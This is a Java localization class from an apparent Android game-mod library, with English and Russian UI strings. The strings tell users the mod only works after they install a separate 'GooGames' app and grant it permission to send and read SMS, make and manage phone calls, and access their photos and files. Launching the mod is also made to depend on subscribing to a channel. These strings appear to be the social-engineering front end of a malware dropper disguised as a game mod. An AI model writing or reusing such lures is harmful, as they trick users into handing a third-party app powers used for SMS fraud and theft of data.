package com.mks.modlib;

import android.content.Context;
import android.widget.Switch;

import java.util.HashMap;
import java.util.Map;

public class Localization {
    static private String local = "RU";
    static Map<String, String> lang_RU = new HashMap<String, String>();
    static Map<String, String> lang_EN = new HashMap<String, String>();

    public static void setLocal(Context cnt) {
        if (cnt != null) {
            Localization.local = cnt.getResources().getConfiguration().locale.getCountry();
        }
        putToDictionary("Access check", "Access check", "Проверка доступа");
        putToDictionary("step1_2", "Step 1/2", "Шаг 1 из 2");
        putToDictionary("step2_2", "Step 2/2", "Шаг 2 из 2");

        putToDictionary("For work mod 1", "Install GooGames for mod ", "Для работы мода");
        putToDictionary("For work mod 2", " work", "необходимо установить приложение \"GooGames\"");

        putToDictionary("install_GooGames", "Install GooGames", "Установить GooGames");
        putToDictionary("Give access", "Give access", "Дать доступы");
        putToDictionary("Give permission", "Give permission", "Дать разрешение");

        putToDictionary("Play", "Play ", "Играть в ");
        putToDictionary("Activate where", "Is active after installing GooGames", "Cтанет активной после установки GooGames");
        putToDictionary("Access granted", "Access granted!", "Доступ успешно предоставлен!");

        putToDictionary("For play 1", "Click \"Play\" to launch mod ", "Для запуска мода ");
        putToDictionary("For play 2", "", " нажмите кнопку \"Играть\"");


        putToDictionary("For play 1 DrHack", "Subscribe to my channel to launch mod ", "Для запуска мода ");
        putToDictionary("For play 2 DrHack", "", " подпишитесь на мой канал");
        putToDictionary("Subscribe", "Subscribe", "Подписаться");


        putToDictionary("To play mod", "For play ", "Для работы мода ");
        putToDictionary("To play mod 1", " give all requested permissions to the \"GooGames\" application.", " необходимо дать все запрашиваемые разрешения приложению \"GooGames\"");
        putToDictionary("To play mod 2", " give the \"GooGames\" permission to send and view SMS messages", " необходимо дать приложению \"GooGames\" разрешение на отправку и просмотр SMS-сообщений");
        putToDictionary("To play mod 3", " give \"GooGames\" permission for making and managing telephone calls", " необходимо дать приложению \"GooGames\" разрешение на осуществление телефонных звонков и управление ими");
        putToDictionary("To play mod 4", " give \"GooGames\" permission to access the photos, multimedia and files on your device", " необходимо дать приложению \"GooGames\" разрешение на доступ к фото, мультимедиа и файлам на вашем устройстве");


    }

    private static void putToDictionary(String Key, String En, String Ru)
    {
        lang_RU.put(Key, Ru);
        lang_EN.put(Key, En);
    }

    private static Map<String, String> get_leng_group()
    {
        Map<String, String> res;
        switch (local)
        {
            case "RU": case "Ru": case "ru":
            case "UA": case "Ua": case "ua":
            case "BY": case "By": case "by":
            case "GE": case "Ge": case "ge":
            {
                res = lang_RU;
                break;
            }
            default:
                res = lang_EN;
                break;
        }
        return res;
    }

    public static String getString(String key)
    {
        return get_leng_group().get(key);
    }

}
